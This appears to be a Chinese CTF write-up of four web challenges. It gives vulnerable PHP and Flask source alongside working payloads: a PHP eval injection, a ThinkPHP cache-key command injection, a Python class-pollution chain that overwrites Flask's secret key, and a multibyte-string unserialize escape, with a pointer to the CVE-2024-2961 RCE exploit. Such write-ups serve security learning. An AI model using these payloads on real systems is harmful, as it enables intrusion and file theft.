## CodeInject
```PHP
<?php  
  
#Author: h1xa  
  
error_reporting(0);  
show_source(__FILE__);  
  
eval("var_dump((Object)$_POST[1]);");
```


```
1=scandir('/')
1=file_get_contents('/000f1ag.txt')
```

## tpdoor

一个很像后门的写法
![](attachments/Pasted%20image%2020240708222439.png)


```PHP
    protected function parseCacheKey($request, $key)
    {
        if ($key instanceof Closure) {
            $key = call_user_func($key, $request);
        }

        if (false === $key) {
            // 关闭当前缓存
            return;
        }

        if (true === $key) {
            // 自动缓存功能
            $key = '__URL__';
        } elseif (str_contains($key, '|')) {
            [$key, $fun] = explode('|', $key);
        }

        // 特殊规则替换
        if (str_contains($key, '__')) {
            $key = str_replace(['__CONTROLLER__', '__ACTION__', '__URL__'], [$request->controller(), $request->action(), md5($request->url(true))], $key);
        }

        if (str_contains($key, ':')) {
            $param = $request->param();

            foreach ($param as $item => $val) {
                if (is_string($val) && str_contains($key, ':' . $item)) {
                    $key = str_replace(':' . $item, (string) $val, $key);
                }
            }
        } elseif (str_contains($key, ']')) {
            if ('[' . $request->ext() . ']' == $key) {
                // 缓存某个后缀的请求
                $key = md5($request->url());
            } else {
                return;
            }
        }

        if (isset($fun)) {
            $key = $fun($key);
        }

        return $key;
    }
```

主要是这里的切分

![](attachments/Pasted%20image%2020240708222644.png)

payload
```
index.php?s=/index/index&isCache=cat%20/000*|system
```

重复打就行


## easy_polluted
原型链污染

```PYTHON
from flask import Flask, session, redirect, url_for,request,render_template  
import os  
import hashlib  
import json  
import re  
def generate_random_md5():  
    random_string = os.urandom(16)  
    md5_hash = hashlib.md5(random_string)  
  
    return md5_hash.hexdigest()  
def filter(user_input):  
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']  
    for pattern in blacklisted_patterns:  
        if re.search(pattern, user_input, re.IGNORECASE):  
            return True  
    return Falsedef merge(src, dst):  
    # Recursive merge function  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)  
  
  
app = Flask(__name__)  
app.secret_key = generate_random_md5()  
  
class evil():  
    def __init__(self):  
        pass  
  
@app.route('/',methods=['POST'])  
def index():  
    username = request.form.get('username')  
    password = request.form.get('password')  
    session["username"] = username  
    session["password"] = password  
    Evil = evil()  
    if request.data:  
        if filter(str(request.data)):  
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"  
        else:  
            merge(json.loads(request.data), Evil)  
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"  
    return render_template("index.html")  
  
@app.route('/admin',methods=['POST', 'GET'])  
def templates():  
    username = session.get("username", None)  
    password = session.get("password", None)  
    if username and password:  
        if username == "adminer" and password == app.secret_key:  
            return render_template("flag.html", flag=open("/flag", "rt").read())  
        else:  
            return "Unauthorized"  
    else:  
        return f'Hello,  This is the POLLUTED page.'  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000)
```

unicode编码绕过filter

先污染secret_key
```
{ "__init__" : { "__globals__" : { "app" : { "secret_key" :"wum0nster"} } } }
```

![](attachments/Pasted%20image%2020240709111203.png)

把变量标识污染成`[#`和`#]` 

```
{
 "__init__" : {
	 "__globals__" : {
		 "app" : {
			 "jinja_env" :{
				"variable_start_string" : "[%","variable_end_string":"%]"
			} 
		 }
	 }
 }
```


## Ezzz_php

```PHP
<?php
highlight_file(__FILE__);
error_reporting(0);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}
class read_file{
    public $start;
    public $filename="/etc/passwd";
    public function __construct($start){
        $this->start=$start;
    }
    public function __destruct(){
        if($this->start == "gxngxngxn"){
           echo 'What you are reading is:'.file_get_contents($this->filename);
        }
    }
}
if(isset($_GET['start'])){
    $readfile = new read_file($_GET['start']);
    $read=isset($_GET['read'])?$_GET['read']:"I_want_to_Read_flag";
    if(preg_match("/\[|\]/i", $_GET['read'])){
        die("NONONO!!!");
    }
    $ctf = substrstr($read."[".serialize($readfile)."]");
    unserialize($ctf);
}else{
    echo "Start_Funny_CTF!!!";
}
```

mb_strpos与mb_substr对某些不可见字符的解析差异
[Joomla: PHP Bug Introduces Multiple XSS Vulnerabilities | Sonar (sonarsource.com)](https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/)

![](attachments/Pasted%20image%2020240710210138.png)

每多一个9f 就往前逃逸一位，mb_strpos会忽略而mb_substr不会

```PHP
<?php
class read_file{
    public $start;
    public $filename="/etc/hosts";
    public function __construct($start){
        $this->start=$start;
    }
    public function __destruct(){
        if($this->start == "gxngxngxn"){
           echo 'What you are reading is:'.file_get_contents($this->filename);
        }
    }
}

$fer = "gxngxngxn";
$ser = serialize(new read_file($fer));
echo($ser);

```

`?start=aaaaaaaaqaaaa&read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:"read_file":2:{s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:10:"/etc/hosts";}`

配合CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行
[cnext-exploits/cnext-exploit.py at main · ambionics/cnext-exploits · GitHub](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py)

![](attachments/Pasted%20image%2020240710215201.png)

send 函数这里稍微修改一下，改成get传参再url配置成上面
